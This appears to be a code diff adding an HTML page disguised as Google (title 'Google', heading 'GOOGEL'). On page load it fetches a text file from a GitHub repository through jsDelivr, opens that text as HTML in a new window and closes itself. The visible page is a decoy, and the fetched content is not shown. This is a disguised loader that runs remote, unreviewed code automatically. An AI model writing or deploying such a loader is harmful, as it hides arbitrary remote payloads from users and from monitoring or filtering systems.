@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body onload="runFromURL('https://cdn.jsdelivr.net/gh/bananabitbread/bananabitbread.github.io@main/browser.txt')">
+    <div class="container">
+        <strong><big><h1>GOOGEL</h1></big></strong>
+    </div>
+    <script>
+        async function runFromURL(url) {
+    const res = await fetch(url);
+    const text = await res.text();
+    const blob = new Blob([text], { type: "text/html" });
+    window.open(URL.createObjectURL(blob), "_blank");
+    window.close();
+}
+
+        </script>
+</body>
+</html>
